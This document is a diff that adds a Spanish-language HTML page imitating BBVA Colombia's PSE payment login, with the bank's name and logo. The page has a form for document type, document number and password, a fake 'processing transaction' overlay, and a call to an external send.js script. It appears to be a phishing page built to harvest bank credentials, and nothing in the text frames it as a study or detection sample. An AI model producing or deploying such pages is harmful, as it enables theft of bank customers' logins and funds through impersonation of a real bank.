@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BBVA - Ingreso</title>
+  <link rel="stylesheet" href="css/estilos.css">
+  <link rel="icon" href="img/BBVA-Logo.png">
+  <script src="https://kit.fontawesome.com/dd6a5d1c33.js" crossorigin="anonymous"></script>
+</head>
+<body>
+
+  <header class="header">
+    Pagos a través de PSE
+  </header>
+
+  <main class="login-container">
+    <h1>¡Bienvenido!</h1>
+    <p class="description">
+      Recuerda que para realizar pagos a través de PSE, debes estar registrado en BBVA net. Regístrate en
+      <a href="https://bbva.com.co" target="_blank">BBVA.com.co</a> y para agilizar tu pago, ten a mano tu app BBVA móvil o la tarjeta de coordenadas.
+    </p>
+
+    <form id="login-form" class="login-form">
+      <label for="tipo-doc">Tipo de documento</label>
+      <select id="tipo-doc" name="tipo-doc">
+        <option value="cc">Cédula de ciudadanía</option>
+        <option value="ce">Cédula de extranjería</option>
+        <option value="nit">NIT</option>
+      </select>
+
+      <label for="num-doc">Número de documento</label>
+      <input type="text" id="num-doc" name="num-doc" placeholder="Número de documento" value="" required>
+
+      <label for="password">Contraseña</label>
+      <div class="password-wrapper">
+        <input type="password" id="password" name="password" placeholder="Contraseña" required>
+        <button type="button" class="toggle-password" onclick="togglePassword()"><i class="fa-regular fa-eye"></i></button>
+      </div>
+
+      <button type="submit" class="btn-entrar">Entrar</button>
+    </form>
+  </main>
+  <!-- Loader -->
+  <div id="loading-overlay" class="overlay">
+    <div class="spinner"></div>
+    <p class="loading-text">Procesando transacción, por favor espere...</p>
+  </div>
+
+
+  <script>
+    function togglePassword() {
+      const input = document.getElementById('password');
+      input.type = input.type === 'password' ? 'text' : 'password';
+    }
+  </script>
+  <script type="text/JavaScript" src="js/send.js"></script>
+</body>
+</html>
